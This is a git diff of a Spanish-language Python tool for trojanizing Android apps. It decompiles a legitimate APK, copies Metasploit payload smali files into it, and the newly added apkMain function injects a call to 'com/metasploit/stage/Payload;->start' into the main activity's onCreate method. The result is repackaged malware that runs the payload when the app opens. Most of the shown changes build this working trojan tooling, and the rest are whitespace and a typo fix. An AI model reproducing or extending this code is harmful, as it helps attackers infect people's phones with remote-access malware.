@@ -128,7 +128,7 @@ def menu_linux_descomprimir_apk(ruta_apks):
         print(f"\nHa seleccionado descomprimir: {apk_seleccionado}")
 
         apk_path = os.path.join(ruta_apks, apk_seleccionado)
-
+        
         # Descomprimir el archivo .zip directamente al directorio
         resultUnzipCompressedApk = subprocess.run(["unzip", "-j", apk_path, "-d", ruta_apks])
 
@@ -164,7 +164,7 @@ def decompileApk(apk_file):
             except subprocess.CalledProcessError as e:
                 print(f"Error al eliminar el directorio antiguo decompilado: {e}")
                 sys.exit(1)
-                
+        
         # Decompilar el APK
         print(f"\nDecompilando APK con apktool...\n")
         resultDecompileApk = subprocess.run(["apktool", "d", apk_file, "-o", apk_file_without_extension])
@@ -212,7 +212,7 @@ def evilApkDecompile(compiledEvilApk, decompiledEvilApk):
             print(f"\nError al decompilar el APK maligno {compiledEvilApk}.")
             sys.exit(1)
 
-def copyEvilSmali(ruta_apks, ruta_trojan_apk):
+def copyEvilSmali(ruta_apks, ruta_trojan_apk):    
     if not os.path.exists(ruta_apks):
         print(f"\nError: No se encuentran APKs en {ruta_apks}.\n")
         return
@@ -228,7 +228,7 @@ def copyEvilSmali(ruta_apks, ruta_trojan_apk):
         print(f"{idx}. {carpeta}")
 
     try:
-        seleccion = int(input("\nSeleccione el número del proyeccto que se va a troyanizar: "))
+        seleccion = int(input("\nSeleccione el número del proyecto que se va a troyanizar: "))
         if seleccion < 1 or seleccion > len(carpetas):
             print("Selección inválida.")
             return
@@ -246,9 +246,73 @@ def copyEvilSmali(ruta_apks, ruta_trojan_apk):
             print(f"\nCopiando ficheros Smali malignos a APK original.")
             os.chdir(ruta_trojan_apk)
             os.system(f"tar -cf - ./smali | (cd {copy_malicious_smali_to_apk_legit_route}; tar -xpf -)")
+            
+            apkMain(carpeta_path, copy_malicious_smali_to_apk_legit_route)
 
     except ValueError:
         print("\nEntrada inválida. Por favor ingrese un número.")
+
+def apkMain(carpeta_path, copy_malicious_smali_to_apk_legit_route):
+    print(f"{carpeta_path}")
+    os.chdir(carpeta_path)
+    
+    comandoEgrep = (
+        f"grep -B2 'MAIN' AndroidManifest.xml | awk -F '\"' '{{print $4}}'"
+    )
+
+    resultComandoEgrep = subprocess.run(comandoEgrep, shell=True, capture_output=True)
+    salida_decodificada = resultComandoEgrep.stdout.decode("utf-8").strip()
+
+    if salida_decodificada:
+        actividad_principal = salida_decodificada.split(".")[-1]  # Extraer solo la última parte después del "/"
+        print(f"Actividad principal encontrada: {actividad_principal}")
+
+        os.chdir(copy_malicious_smali_to_apk_legit_route)
+
+        archivo_smali = f"{actividad_principal}.smali"
+        
+        # Usamos find para buscar el archivo smali en el directorio
+        comando_find = f"find . -type f -name '{archivo_smali}' | grep -v 'metasploit'"
+        
+        result_find = subprocess.run(comando_find, shell=True, capture_output=True, text=True)
+        archivo_encontrado = result_find.stdout.strip()  
+
+        if archivo_encontrado:
+            archivo_encontrado = archivo_encontrado.lstrip('./')
+            archivo_main = os.path.join(copy_malicious_smali_to_apk_legit_route, archivo_encontrado)
+            print(f"\n{archivo_main}")
+
+            # Abrir y modificar el archivo smali
+            try:
+                # Abrir el archivo en modo de lectura
+                with open(archivo_main, 'r+') as file:
+                    lineas = file.readlines()
+
+                    # Línea que contiene '.method protected onCreate(Landroid/os/Bundle;)V'
+                    metodo_oncreate = '.method protected onCreate(Landroid/os/Bundle;)V'
+                    nueva_linea = "invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n"
+                    encontrado = False
+
+                    for i in range(len(lineas)):
+                        if metodo_oncreate in lineas[i]:
+                            # Insertar la nueva línea justo después de la línea del método
+                            lineas.insert(i + 1, nueva_linea)
+                            encontrado = True
+                            break
+
+                    if encontrado:
+                        # Volver al principio del archivo y sobrescribirlo con las líneas modificadas
+                        file.seek(0)
+                        file.writelines(lineas)
+                        print("\nLínea añadida correctamente debajo del método onCreate.")
+                    else:
+                        print(f"\nNo se encontró el método '{metodo_oncreate}' en el archivo.")
+
+            except Exception as e:
+                print(f"Error al modificar el archivo: {e}")
+
+        else:
+            print(f"\nNo se encontró el archivo smali para la actividad principal '{actividad_principal}'")
 
 def verificar_programa_windows(programa):
     result_verificar_programas_windowsx = subprocess.run(["where", programa])
